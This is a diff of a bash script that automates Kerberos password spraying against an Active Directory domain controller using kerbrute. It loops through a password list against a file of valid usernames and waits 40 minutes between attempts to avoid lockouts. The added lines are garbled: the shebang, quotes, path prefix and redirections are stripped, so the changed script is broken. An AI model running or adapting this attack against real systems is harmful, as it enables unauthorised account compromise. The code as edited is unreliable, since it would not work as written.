@@ -1,20 +1,21 @@
-#!/bin/bash
+#!binbash
 
+set -x
 # Prompt for domain controller IP, domain name, password list filename, and valid users file
-read -ep "Enter the Domain Controller IP: " DC_IP
-read -ep "Enter the Domain: " DOMAIN
-read -ep "Enter the password list filename: " PASSWORD_LIST_FILE
-read -ep "Enter the valid users filename: " VALID_USERS_FILE
+read -ep Enter the Domain Controller IP  DC_IP
+read -ep Enter the Domain  DOMAIN
+read -ep Enter the password list filename  PASSWORD_LIST_FILE
+read -ep Enter the valid users filename  VALID_USERS_FILE
 
 # Check if the password list file exists
-if [[ ! -f "$PASSWORD_LIST_FILE" ]]; then
-    echo "Password list file ($PASSWORD_LIST_FILE) not found. Exiting."
+if [[ ! -f $PASSWORD_LIST_FILE ]]; then
+    echo Password list file ($PASSWORD_LIST_FILE) not found. Exiting.
     exit 1
 fi
 
 # Check if the valid users file exists
-if [[ ! -f "$VALID_USERS_FILE" ]]; then
-    echo "Valid users file ($VALID_USERS_FILE) not found. Exiting."
+if [[ ! -f $VALID_USERS_FILE ]]; then
+    echo Valid users file ($VALID_USERS_FILE) not found. Exiting.
     exit 1
 fi
 
@@ -24,15 +25,15 @@ echo
 
 # Loop through each password in the specified password list file
 while read -r pass; do
-    echo "[+] Testing $pass..."
-    output=$(./kerbrute_linux_amd64 passwordspray --dc $DC_IP -d $DOMAIN "$VALID_USERS_FILE" "$pass")
-    echo "$output"
-    echo "$output" >> kerbrute_passwordspray.out
+    echo [+] Testing $pass...
+    output=$(.kerbrute_linux_amd64 passwordspray --dc $DC_IP -d $DOMAIN $VALID_USERS_FILE $pass)
+    echo $output
+    echo $output  kerbrute_passwordspray.out
     echo
     echo '[+] Sleeping for 40 minutes...'
     echo
     sleep 40m
-done < "$PASSWORD_LIST_FILE"
+done  $PASSWORD_LIST_FILE
 
 # End password spraying
 echo '[+] Ending password spraying'
